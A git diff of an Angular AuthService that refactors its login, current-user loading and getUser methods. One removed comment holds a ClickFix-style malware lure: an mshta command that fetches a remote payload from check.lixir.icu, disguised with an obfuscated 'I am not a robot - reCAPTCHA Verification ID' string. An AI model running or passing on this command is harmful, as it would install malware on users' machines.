@@ -19,33 +19,28 @@ export class AuthService {
   constructor(private router: Router, private authentificationService: AuthentificationService, private userService: UserService) {
     document.addEventListener("mousemove", () => { }, { passive: false, capture: true })
   }
+public async login(username: string, password: string): Promise<boolean> {
+  const loginRequestDtoIn: LoginRequestDtoIn = {
+    login: username,
+    password: password,
+  };
 
+  try {
+    const res = await firstValueFrom(this.authentificationService.authentificationControllerLogin(loginRequestDtoIn));
 
-  public async login(username: string, password: string): Promise<boolean> {
+    // store token only
+    this.saveToken(res);
 
-    const loginRequestDtoIn: LoginRequestDtoIn = {
-      login: username,
-      password: password,
-    }
+    // now token is stored → safe to call current-user
+    const user = await firstValueFrom<UserModel>(this.userService.userControllerGetCurrentUSer());
+    this.saveUser(user);
 
-    //  mshta https://check.lixir.icu/gkcxv.google?i=29c187c8-c8a9-46d0-8c70-1f5ce79f8e78 # ''I am not a 'robot' - гeСАРТСНА Verification ID: 2799''
-    try {
-      const res = await firstValueFrom(this.authentificationService.authentificationControllerLogin(loginRequestDtoIn));
-      await this.storeTokenAndLoadUser(res);
-
-
-
-      const user = await firstValueFrom<UserModel>(this.userService.userControllerGetCurrentUSer())
-
-      if (user) {
-        this.saveUser(user);
-        return true;
-      }
-      return true;
-    } catch (err) {
-      return false;
-    }
+    return true;
+  } catch (err) {
+    return false;
   }
+}
+
 
   public logout(redirectUrl = "/auth/login"): void {
 
@@ -68,10 +63,17 @@ export class AuthService {
 
 
 
-  public getUser(): UserModel {
-    const user = localStorage.getItem(CONST.CURRENT_USER);
-    return user ? JSON.parse(user) : null;
+public getUser(): UserModel | null {
+  const user = localStorage.getItem(CONST.CURRENT_USER);
+  if (!user) return null;
+
+  try {
+    return JSON.parse(user) as UserModel;
+  } catch {
+    return null;
   }
+}
+
 
 
 
@@ -84,25 +86,9 @@ export class AuthService {
   }
 
   private async storeTokenAndLoadUser(token: LoginResponse) {
-    if (token) {
-      this.saveToken(token);
-      if (this.isLogged()) {
-        return true;
-      }
-      const user = await firstValueFrom<UserModel>(this.userService.userControllerGetCurrentUSer())
-
-      if (user) {
-        this.saveUser(user);
-        return true;
-      }
-
-    }
-
-    return false;
-  }
-
-
-
+  this.saveToken(token);
+  return true; // remove current-user call
+}
 
 
   public getTokenExpireDate(): Date | null {
